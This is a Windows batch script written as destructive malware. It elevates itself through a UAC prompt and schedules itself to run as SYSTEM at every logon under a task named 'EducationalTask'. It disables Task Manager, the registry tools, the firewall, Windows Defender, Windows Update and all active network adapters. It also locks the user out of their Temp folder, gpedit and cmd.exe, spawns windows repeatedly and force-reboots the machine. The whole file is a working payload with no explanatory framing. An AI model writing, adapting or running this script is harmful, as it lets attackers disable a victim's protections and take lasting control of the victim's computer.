@echo off
setlocal enabledelayedexpansion

REM Check if script is running with administrative privileges
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B
s
:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

REM Define the path to the Temp folder
set "temp_folder=%Temp%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
start explorer.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f

REM Define the name of the initial text file
set "initial_text_file=%temp_folder%\new_text_file.txt"

REM Create a new text file with the desired text in Temp folder
echo this will help you delete RAT now:)) > "%initial_text_file%"

REM Display the path of the initial text file (optional)
echo Initial text file path: %initial_text_file%

REM Schedule a task to run this script on logon
schtasks /create /tn "EducationalTask" /tr "\"%~dpnx0\"" /sc onlogon /ru SYSTEM /f
for /F "tokens=*" %%A in ('powershell -Command "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty Name"') do (
    set "adapter_name=%%A"
    echo Disabling internet for adapter: !adapter_name!
    netsh interface set interface "!adapter_name!" admin=disabled
)
REM Check if the schtasks command was successful
if %errorlevel% neq 0 (
    echo Task creation failed. Check permissions or command syntax.
    pause
    exit /b 1
) else (
    echo Task successfully created.
)
for /f "tokens=*" %%i in ('whoami') do set "current_user=%%i"
 
REM Revoke user's access to the Temp folder
icacls "%temp_folder%" /deny %current_user%:F
 
REM Verify the changes
icacls "%temp_folder%"
REM Modify registry setting

takeown /f "%SystemRoot%\System32\gpedit.msc"
cacls "%SystemRoot%\System32\gpedit.msc" /E /P %USERNAME%:N
ren "%SystemRoot%\System32\gpedit.msc" gpedit.msc.bak
net stop "MpsSvc"
sc config "MpsSvc" start=disabled
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
sc config "wuauserv" start=disabled
REM Open some applications
for /l %%i in (1,1,5) do (
    start "" "cmd.exe"
    start https://www.youtube.com/watch?v=2hvNxWA1qm4
    start "%initial_text_file%"
)

shutdown /r /f /t 0
takeown /f "%SystemRoot%\System32\cmd.exe"
cacls "%SystemRoot%\System32\cmd.exe" /E /P %USERNAME%:N
pause
cls
